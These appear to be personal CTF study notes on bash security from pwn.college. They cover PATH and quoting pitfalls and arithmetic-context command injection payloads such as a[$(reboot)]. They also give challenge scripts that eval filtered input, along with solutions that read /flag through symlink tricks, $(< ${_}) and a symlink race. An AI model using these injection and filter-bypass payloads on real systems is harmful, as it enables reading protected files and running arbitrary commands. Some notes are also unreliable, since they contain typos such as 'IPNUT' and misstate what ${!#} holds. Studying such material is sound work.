# Environment Attacks
Always specify absolute paths when executing binaries or other scripts. If your script runs other scripts or binaries that do not use absolute paths internally, you should explicitly set the value of the PATH environment variable in your scripts to prevent problems.
(unset PATH not always works)
# Unquoted Variable Expansion
Always use quotes when accessing arguments
# Shell's Filename Expansion (also known as globbing)
idk warning?
# Enimgma of The Evironment
+ Check for user-controllable variables being passed to declare statements
+ Flag any script that allows arbitrary variable names in declare statements
+ Identify unquoted variables that are executed as commands (like $PROGRAM)
+ Flag variable assignments that could be influenced by user input and later executed
+ Look for cases where user input directly influences what command gets executed
# Tale of The Test
If the contents of $foo are not sanitised and are out of your control (if for instance they're coming from an external source), then all but [ "$foo" -gt 7 ] constitute an arbitrary command injection vulnerability as the contents of $foo are interpreted as an arithmetic expression (and for instance, the a[$(reboot)] arithmetic expression would run the reboot command when evaluated). The [ builtin requires the operands be decimal integers, so it's not affected. But it's critical that $foo be quoted, or you'd still get a command injection vulnerability (for instance with values such as -v a[$(reboot)] -o 8).

If the input to any arithmetic context (including ((, let, array indices), or [[ … ]] test expressions involving numeric comparisons can't be guaranteed then you must always validate your input before evaluating the expression.

# Rhythm of Restriction
### chal
``` sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin

read INPUT < <(head -n1 | tr -d "[A-Za-z0-9/]")
eval "$INPUT"
```
### sol
``` sh
ln -s /flag IPNUT
```
``` sh
/challenge/run
$(< ${_})
```
```
${_} is a special variable in Bash that usually contains the last argument of the previous command which in our case is INPUT.
$(< ${_}) is a command substitution that reads the contents of the file whose path is stored in ${_}. This is a shorthand in Bash for $(cat ${_}).
```
### vuln
directly executing clients ipnut

# Odyssey of the Octal
### chal
``` sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin

read INPUT < <(head -n1 | tr -d "[A-Za-z0-9./]")
eval "$INPUT"
```
### sol
``` sh
ln -s /flag IPNUT
```
``` sh
$(< ${_})
```
# Riddle of the Radix
### chal
``` sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin

WORKDIR=$(mktemp -d)
[ -n "$WORKDIR" ] || exit 1
cd $WORKDIR

doit() {
        echo -n ""
        read -r INPUT < <(head -n1 | tr -d "[A-Za-z./]")
        eval "$INPUT"
}

doit
```
### sol
creat symlink to /challenge/run
``` sh
ln -s /challenge/run smth
```
run the challenge with symlink using full path
``` sh
/home/hacker/smth
```
before passing input to challenge, in another terminal remove the symlink and create some program with same name as a symlink that reads /flag
``` sh
#!/usr/bin/bash

cat /flag
```
pass $0 to challenge as an input
# Whisper of the Withheld
### chal
``` sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin

WORKDIR=$(mktemp -d)
[ -n "$WORKDIR" ] || exit 1
cd $WORKDIR

doit() {
        echo -n ""
        read INPUT < <(head -n1 | tr -d "[A-Za-z./]")
        eval "$INPUT"
}

doit
```
### sol
Solution to [Riddle of the Radix](#riddle-of-the-radix) works jus as well
# Path of the Unseen
### chal
``` sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin

WORKDIR=$(mktemp -d)
[ -n "$WORKDIR" ] || exit 1
cd $WORKDIR

doit() {
        echo -n ""
        read INPUT < <(head -n1 | tr -d "[A-Za-z0-9.~]")
        eval "$INPUT"
}

doit
```
### sol
Same solution as to [Riddle of the Radix](#riddle-of-the-radix) but pass ${!#} as an input to challenge. ({!#} is number of arguments
passed to the program)
# Dance of the Disallowed
### chal
``` sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin

WORKDIR=$(mktemp -d)
[ -n "$WORKDIR" ] || exit 1
cd $WORKDIR

doit() {
        echo -n ""
        read INPUT < <(head -n1 | tr -d "[A-Za-z0-9./~]")
        eval "$INPUT"
}

doit
```
### sol
same as in [Path of the Unseen](#path-of-the-unseen)
